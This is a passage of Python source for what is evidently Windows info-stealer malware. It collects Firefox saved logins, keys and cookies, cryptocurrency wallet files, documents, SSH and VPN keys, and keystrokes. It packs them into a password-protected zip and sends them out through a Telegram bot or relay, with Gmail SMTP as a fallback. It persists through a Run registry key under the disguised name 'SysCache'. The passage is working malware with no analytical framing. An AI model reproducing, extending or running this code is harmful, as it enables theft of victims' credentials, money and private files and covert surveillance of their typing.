        for prof in os.listdir(ff):
            for fn in ("logins.json", "key4.db", "cookies.sqlite", "places.sqlite"):
                take(os.path.join(ff, prof, fn), os.path.join(d, "firefox", prof))

    for w, cap in ((os.path.join(APPDATA, "Exodus", "exodus.wallet"), 8 * 1024 * 1024),
                   (os.path.join(APPDATA, "Electrum", "wallets"), 4 * 1024 * 1024),
                   (os.path.join(APPDATA, "Ethereum", "keystore"), 4 * 1024 * 1024),
                   (os.path.join(APPDATA, "Bitcoin", "wallet.dat"), 4 * 1024 * 1024)):
        if os.path.isdir(w):
            for r, _, fs in os.walk(w):
                for fn in fs:
                    take(os.path.join(r, fn), os.path.join(d, "wallets"), cap)
        else:
            take(w, os.path.join(d, "wallets"), cap)

    exts = (".txt",".pdf",".doc",".docx",".xls",".xlsx",".csv",".rtf",
            ".kdbx",".ovpn",".rdp",".pem",".key",".ppk",".json")
    n = 0
    for base in ("Desktop", "Documents", "Downloads"):
        p = os.path.join(os.path.expanduser("~"), base)
        if not os.path.isdir(p):
            continue
        for r, _, fs in os.walk(p):
            for fn in fs:
                if n > 80 or BUDGET[0] < 400 * 1024:
                    break
                if fn.lower().endswith(exts):
                    take(os.path.join(r, fn), os.path.join(d, "files", base), 2 * 1024 * 1024)
                    n += 1

    with open(os.path.join(d, "keystrokes.txt"), "w", encoding="utf-8", errors="ignore") as f:
        f.write(drain())
    return d

def pack(d):
    out = d + ".zip"
    if pyzipper:
        with pyzipper.AESZipFile(out, "w", compression=pyzipper.ZIP_DEFLATED,
                                 encryption=pyzipper.WZ_AES) as z:
            z.setpassword(CFG["zip_pw"].encode())
            for r, _, fs in os.walk(d):
                for fn in fs:
                    p = os.path.join(r, fn)
                    z.write(p, os.path.relpath(p, d))
    else:
        import zipfile
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
            for r, _, fs in os.walk(d):
                for fn in fs:
                    p = os.path.join(r, fn)
                    z.write(p, os.path.relpath(p, d))
    shutil.rmtree(d, ignore_errors=True)
    return out

# ------------------------------------------------------------------- send
def mp(fields, name, fname, data):
    b = "----B" + hashlib.md5(os.urandom(16)).hexdigest()
    out = b""
    for k, v in fields.items():
        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                % (b, k, v)).encode()
    out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n" % (b, name, fname)).encode()
    out += data + b"\r\n" + ("--%s--\r\n" % b).encode()
    return b, out

def tg(subject, body, fname, data):
    cap = (subject + "\n" + body)[:900]
    fields = {"chat_id": CFG["chat"], "caption": cap, "protect_content": "true"}
    b, body_bytes = mp(fields, "document", fname, data)
    if CFG["worker"]:
        url = CFG["worker"].rstrip("/") + "/up"
    else:
        url = "https://api.telegram.org/bot%s/sendDocument" % CFG["token"]
    for att in range(4):
        try:
            req = urllib.request.Request(url, data=body_bytes, method="POST")
            req.add_header("Content-Type", "multipart/form-data; boundary=" + b)
            if CFG["worker"]:
                req.add_header("X-Sig", hmac.new(CFG["secret"].encode(), body_bytes,
                                                 hashlib.sha256).hexdigest())
            with urllib.request.urlopen(req, timeout=120) as r:
                return json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            try:
                j = json.loads(e.read().decode())
                wait = j.get("parameters", {}).get("retry_after", 15)
            except Exception:
                wait = 15
            log("tg http %s" % e.code)
            time.sleep(wait)
        except Exception as e:
            log("tg fail %r" % e)
            time.sleep(20 * (att + 1))
    return None

def smtp_send(subject, body, fname, data):
    if not CFG["smtp_pw"]:
        return
    try:
        m = EmailMessage()
        m["From"] = "SysCache <%s>" % CFG["smtp_user"]
        m["To"] = CFG["smtp_user"]
        m["Subject"] = subject
        m.set_content(body)
        m.add_attachment(data, maintype="application", subtype="octet-stream", filename=fname)
        with smtplib.SMTP_SSL("smtp.gmail.com", 465,
                              context=ssl.create_default_context(), timeout=90) as s:
            s.login(CFG["smtp_user"], CFG["smtp_pw"])
            s.send_message(m)
    except Exception as e:
        log("smtp fail %r" % e)

def ship(zpath, tag):
    try:
        data = open(zpath, "rb").read()
    except Exception:
        return
    try:
        os.remove(zpath)
    except Exception:
        pass
    base = "%s_%s" % (mid(), datetime.now().strftime("%Y%m%d-%H%M%S"))
    note = "pw: %s" % CFG["zip_pw"]
    if len(data) <= LIMIT:
        if tg("[%s] %s" % (mid(), tag), note, base + ".zip", data) is None:
            smtp_send("[%s] %s" % (mid(), tag), note, base + ".zip", data)
        return
    parts = [data[i:i + LIMIT] for i in range(0, len(data), LIMIT)]
    for i, p in enumerate(parts, 1):
        nm = "%s.part%02dof%02d" % (base, i, len(parts))
        cap = "merge: cat *.part* > loot.zip | " + note
        if tg("[%s] %s %d/%d" % (mid(), tag, i, len(parts)), cap, nm, p) is None:
            smtp_send("[%s] %s %d/%d" % (mid(), tag, i, len(parts)), cap, nm, p)
        time.sleep(2)

def full(tag):
    try:
        ship(pack(harvest()), tag)
    except Exception as e:
        log("harvest fail %r" % e)

# -------------------------------------------------------------- lifecycle
def install():
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        if not os.path.exists(INSTALL_EXE):
            shutil.copy2(sys.argv[0], INSTALL_EXE)
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "/v", "SysCache", "/t", "REG_SZ", "/d", '"%s"' % INSTALL_EXE, "/f"],
                       capture_output=True, creationflags=NO_WIN, timeout=20)
        return True
    except Exception as e:
        log("install fail %r" % e)
        return False

def run():
    threading.Thread(target=Keylogger, daemon=True).start()
    threading.Thread(target=clip, daemon=True).start()
    time.sleep(random.uniform(12, 40))
    full("initial")
    last = time.time()
    while True:
        time.sleep(300)
        ks = drain()
        if ks.strip():
            full("keys")
        if time.time() - last > 2700:
            full("refresh")
            last = time.time()

def main():
    if not sys.platform.startswith("win"):
        return
    if os.path.abspath(sys.argv[0]).lower() != INSTALL_EXE.lower():
        if not mutex("Global\\SysCacheInst"):
            return
        if install():
            subprocess.Popen([INSTALL_EXE], creationflags=0x00000008 | 0x00000200, close_fds=True)
        time.sleep(2)
        return
    time.sleep(random.uniform(1, 3))
    if not mutex("Global\\SysCacheRun"):
        return
    run()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log("fatal")
</script>

